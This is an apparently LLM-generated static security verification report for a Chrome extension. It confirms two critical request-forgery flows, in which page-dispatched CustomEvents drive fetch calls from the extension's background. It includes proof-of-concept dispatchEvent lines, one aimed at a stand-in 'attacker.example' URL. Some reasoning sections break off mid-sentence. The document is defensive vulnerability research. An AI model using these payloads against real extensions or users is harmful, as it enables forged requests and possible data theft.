# ExPAgent Static Verification — aiacepmnmgokkgjaplbbloiccdmmfcaa v16.32

- Browser: `chrome`
- LLM: `deepseek` / `deepseek-v4-pro`
- Flows in report: 5  |  Verified: 2
- Coverage: node=0.179, scope=0.198
- Flow types: {'PRIVILEGE_ESCALATION': 2, 'REQUEST_FORGERY': 3}  |  Severities: {'CRITICAL': 5}

**Assessment:** Verified 2 flow(s): 2 true-positive, 0 false-positive, 0 partial-available (PA), 0 uncertain, 0 duplicate; 0 flagged triggerable for dynamic testing.

---

## Flow #2 — 🔴 TRUE POSITIVE  (REQUEST_FORGERY / CRITICAL, confidence 0.60)

- **Source**: `TARGET_CUSTOM_EVENT` in `popup` [CS_1] @ L474:C8 -> L474:C18
- **Sink**: `FETCH_RESOURCE` in `background` [BG_1] @ L28:C21 -> L28:C31
- **Bridge**: message `runtime.single.sender.message[popup->background]`
- **Severity evidence**: ['*://*/*']
- **Source report Flow ID**: `4`
- **Provenance**: source=`CONTENT_SCRIPT`, sender=`CONTENT_SCRIPT`

**Reasoning:** Structured extraction unavailable; explicit analyst conclusion preserved from the final static transcript: ## Verification of Flow #4 (TARGET_CUSTOM_EVENT → FETCH_RESOURCE)

### 1. Source control — attacker-controlled
The content script `popup.js` (injected into `*://*/*`, all frames, isolated world) registers:

```js
document.addEventListener('RequestLink', function (evt) {
    if (evt.detail != null) {          // L474 — reported anchor
        requestLinkTemp = evt.detail;
        RequestLinkFun()
    }
});
```

A page script can trivially forge this shared-DOM CustomEvent:

```js
document.dispatchEvent(new CustomEvent('RequestLink', {
  detail: { url: 'https://attacker.example/', captcha: false, mid: 'x', mobile: false }
}));
```

`RequestLinkFun()` then sends `requestLinkTemp.url` into the extension:

```js
url = requestLinkTemp.url;                 // evt.detail.url
chrome.runtime.sendMessage({
  type: "RequestLink",
  obj: url,                                // attacker URL
  captcha, mid, incognito, mobile
}, ...);
```

So the source is genuinely page-controllable. The CustomEvent `detail` is the standard page-to-content-script bridge; no `sender.id`/origin trust is involved, and the content-script surface is wildcard.

### 2. Source-to-sink path
The bridge is unbroken and the a

**Attacker control:** See preserved static analyst transcript.

**Confirmed path:** See preserved static analyst transcript.

**Dynamic-test guidance** (triggerable: no, mechanism: `OTHER`)

---

## Flow #4 — 🔴 TRUE POSITIVE  (REQUEST_FORGERY / CRITICAL, confidence 0.60)

- **Source**: `TARGET_CUSTOM_EVENT` in `popup` [CS_1] @ L538:C63 -> L538:C73
- **Sink**: `FETCH_BODY` in `background` [BG_1] @ L37:C1 -> L48:C3
- **Bridge**: message `runtime.single.sender.message[popup->background]`
- **Severity evidence**: ['*://*/*']
- **Source report Flow ID**: `5`
- **Provenance**: source=`CONTENT_SCRIPT`, sender=`CONTENT_SCRIPT`

**Reasoning:** Structured extraction unavailable; explicit analyst conclusion preserved from the final static transcript: ## Flow verification

### Decision ledger

**(a) Who controls the source?**
A webpage. The manifest loads `popup.js` as a content script on `*://*/*`, `runAt: document_start`, all frames. In `popup.js`:

```js
document.addEventListener('AjaxLink', function (evt) {
    var timeReq = setInterval(function () {
        chrome.runtime.sendMessage({ type: "PostRequest", obj: evt.detail }, ...)
```

The page can run `document.dispatchEvent(new CustomEvent('AjaxLink', {detail: {...}}))`, so `evt.detail` — including `url` and `data` — is fully attacker-controlled. There is no authentication, sender check, or origin check.

**(b) Source-to-sink path**
The propagation is unbroken:

1. `popup.js` L536/L538 — attacker-controlled `evt.detail` is sent as `{type:"PostRequest", obj: evt.detail}`.
2. `background.js` L59 — `chrome.runtime.onMessage.addListener`.
3. `background.js` L186 — `request.type == "PostRequest"` branch.
4. `background.js` L187–188 — `linkUrl = request.obj.url`, `datajson = request.obj.data`.
5. `background.js` L200 — `postUrl(linkUrl, datajson, ...)`.
6. `background.js` L36–48 — `fetch(url, { ..., body: data })`.

The `request.type == "PostRequest"` check is attacker-satisfiab

**Attacker control:** See preserved static analyst transcript.

**Confirmed path:** See preserved static analyst transcript.

**Dynamic-test guidance** (triggerable: no, mechanism: `OTHER`)

---
